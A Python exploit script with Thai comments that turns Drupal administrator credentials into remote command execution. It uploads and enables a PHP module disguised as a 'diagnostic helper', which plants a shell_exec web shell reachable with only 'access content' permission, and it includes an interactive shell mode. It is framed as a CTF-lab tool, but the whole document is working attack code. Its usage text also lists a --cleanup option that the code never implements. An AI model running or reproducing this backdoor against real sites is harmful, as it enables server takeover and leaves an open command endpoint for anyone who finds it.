#!/usr/bin/env python3
"""Drupal admin -> RCE via module upload.

ใช้เมื่อได้ credential ของ user ที่มีสิทธิ์ ``administer modules`` (มักเป็น admin)
สคริปต์จะสร้างโมดูล PHP ขนาดเล็ก อัปโหลดผ่านหน้า "Install new module"
เปิดใช้งาน แล้วเรียก route ที่รันคำสั่ง shell บนเครื่องเป้าหมาย

ตัวอย่าง
-------
python tools/drupal_admin_rce.py --url http://target --user admin --pass password --cmd id
python tools/drupal_admin_rce.py --url http://target --user admin --pass password --cmd "find /var/www -iname 'flag*'"
python tools/drupal_admin_rce.py --url http://target --user admin --pass password --shell
python tools/drupal_admin_rce.py --url http://target --user admin --pass password --cleanup

หมายเหตุ: ใช้ได้กับ Drupal 8/9/10 ที่เปิด Update Manager UI และ web user เขียน
โฟลเดอร์ modules/ ได้ (กรณี typical CTF lab) หากระบบต้องใส่ FTP/SSH ผ่าน
authorize.php สคริปต์จะรายงานว่า upload สำเร็จแต่ enable ไม่ได้
"""

import argparse
import html
import os
import re
import secrets
import sys
import tarfile
import tempfile
import time

try:
    import requests
except ImportError:
    sys.exit("ต้องติดตั้ง requests ก่อน: pip install requests")

try:  # ให้ข้อความไทยไม่เพี้ยนบน Windows console (cp874)
    sys.stdout.reconfigure(encoding="utf-8")
except Exception:
    pass


INFO_YML = """name: CTF Helper
type: module
description: 'diagnostic helper'
package: Custom
version: '8.x-1.0'
core_version_requirement: ^8 || ^9 || ^10
core: '8.x'
"""
ROUTING_YML = """{mod}.exec:
  path: '/{mod}'
  defaults:
    _controller: '\\Drupal\\{mod}\\Controller\\ExecController::run'
    _title: 'CTF'
  requirements:
    _permission: 'access content'
"""

CONTROLLER_PHP = """<?php

namespace Drupal\\{mod}\\Controller;

use Drupal\\Core\\Controller\\ControllerBase;

class ExecController extends ControllerBase {{
  public function run() {{
    $cmd = \\Drupal::request()->query->get('c', 'id');
    $out = shell_exec($cmd . ' 2>&1');
    return [
      '#cache' => ['max-age' => 0],
      '#markup' => '<pre>' . htmlspecialchars((string) $out) . '</pre>',
    ];
  }}
}}
"""


def build_module(mod, tmpdir):
    root = os.path.join(tmpdir, mod)
    os.makedirs(os.path.join(root, "src", "Controller"), exist_ok=True)
    files = {
        mod + ".info.yml": INFO_YML,
        mod + ".routing.yml": ROUTING_YML.format(mod=mod),
        os.path.join("src", "Controller", "ExecController.php"): CONTROLLER_PHP.format(mod=mod),
    }
    for rel, content in files.items():
        path = os.path.join(root, rel)
        with open(path, "w", encoding="utf-8", newline="\n") as fh:
            fh.write(content)
    archive = os.path.join(tmpdir, mod + ".tar.gz")
    with tarfile.open(archive, "w:gz") as tar:
        tar.add(root, arcname=mod)
    return archive


def hidden(html_text, name):
    m = re.search(r'name="%s" value="([^"]*)"' % re.escape(name), html_text)
    return m.group(1) if m else None


def login(session, base, user, password):
    r = session.get(base + "/user/login", timeout=20)
    data = {"name": user, "pass": password, "form_id": "user_login_form", "op": "Log in"}
    bid = hidden(r.text, "form_build_id")
    if bid:
        data["form_build_id"] = bid
    r = session.post(base + "/user/login", data=data, timeout=20, allow_redirects=True)
    if "Unrecognized username or password" in r.text:
        raise SystemExit("[-] login failed: bad credential")
    if "user_login_form" in r.text and "/user/logout" not in r.text:
        raise SystemExit("[-] login failed: ยังไม่ผ่าน (ตรวจ URL / user / pass)")
    chk = session.get(base + "/admin", timeout=20)
    if chk.status_code == 403 or "Access denied" in chk.text:
        raise SystemExit("[-] login ได้ แต่ไม่มีสิทธิ์ admin (ต้องมี 'administer modules')")
    print("[+] logged in as %s (admin OK)" % user)


def install(session, base, archive):
    r = session.get(base + "/admin/modules/install", timeout=20)
    if r.status_code != 200 or 'type="file"' not in r.text:
        raise SystemExit("[-] เปิด /admin/modules/install ไม่ได้ (ไม่มีสิทธิ์หรือฟีเจอร์ถูกปิด)")
    data = {
        "project_url": "",
        "form_build_id": hidden(r.text, "form_build_id"),
        "form_token": hidden(r.text, "form_token"),
        "form_id": "update_manager_install_form",
        "op": "Install",
    }
    with open(archive, "rb") as fh:
        files = {"files[project_upload]": (os.path.basename(archive), fh, "application/gzip")}
        r = session.post(base + "/admin/modules/install", data=data, files=files, timeout=120)
    print("[+] upload -> %s %s" % (r.status_code, r.url))


def enable(session, base, mod):
    r = session.get(base + "/admin/modules", timeout=30)
    if mod not in r.text:
        raise SystemExit("[-] โมดูล %s ไม่ปรากฏใน /admin/modules (upload/extract ล้มเหลว)" % mod)
    data = {
        "form_build_id": hidden(r.text, "form_build_id"),
        "form_token": hidden(r.text, "form_token"),
        "form_id": "system_modules",
        "op": "Save configuration",
    }
    # ต้องส่ง checkbox ของโมดูลที่ enable อยู่เดิมทั้งหมด ไม่งั้นจะถูกปิด
    for tag in re.findall(r'<input[^>]*type="checkbox"[^>]*>', r.text):
        if "checked" in tag:
            name = re.search(r'name="([^"]+)"', tag)
            if name:
                data[name.group(1)] = "1"
    data["modules[%s][enable]" % mod] = "1"
    r = session.post(base + "/admin/modules", data=data, timeout=180, allow_redirects=True)
    print("[+] enable %s -> %s" % (mod, r.status_code))


def run(session, base, mod, cmd, tries=5):
    for i in range(tries):
        r = session.get(
            base + "/" + mod,
            params={"c": cmd, "x": secrets.token_hex(4)},
            timeout=90,
        )
        m = re.search(r"<pre>(.*?)</pre>", r.text, re.S)
        if m:
            return html.unescape(m.group(1))
        time.sleep(2)
    return "[!] no output (status %s) - module maybe not enabled" % r.status_code


def main():
    ap = argparse.ArgumentParser(description="Drupal admin -> module upload RCE")
    ap.add_argument("--url", required=True, help="http://target")
    ap.add_argument("--user", default="admin")
    ap.add_argument("--pass", dest="password", default="password")
    ap.add_argument("--cmd", default="id")
    ap.add_argument("--module", default="ctfhelper", help="machine name ของโมดูล")
    ap.add_argument("--shell", action="store_true", help="อ่านคำสั่งจาก stdin วนไปเรื่อยๆ")
    ap.add_argument("--keep", action="store_true", help="ไม่ต้องถอน/ไม่ต้องลบไฟล์ชั่วคราว")
    args = ap.parse_args()

    base = args.url.rstrip("/")
    mod = re.sub(r"[^a-z0-9_]", "", args.module.lower()) or "ctfhelper"

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0", "Cache-Control": "no-cache"})
    login(session, base, args.user, args.password)

    with tempfile.TemporaryDirectory() as tmp:
        archive = build_module(mod, tmp)
        install(session, base, archive)
        enable(session, base, mod)

    print("[*] route: %s/%s?c=<cmd>" % (base, mod))
    if args.shell:
        try:
            while True:
                cmd = input("drupal$ ").strip()
                if not cmd:
                    continue
                if cmd in ("exit", "quit"):
                    break
                print(run(session, base, mod, cmd))
        except (EOFError, KeyboardInterrupt):
            print()
    else:
        print(run(session, base, mod, args.cmd))

    if args.keep:
        print("[*] module %s ยังอยู่บน target (route /%s)" % (mod, mod))


if __name__ == "__main__":
    main()
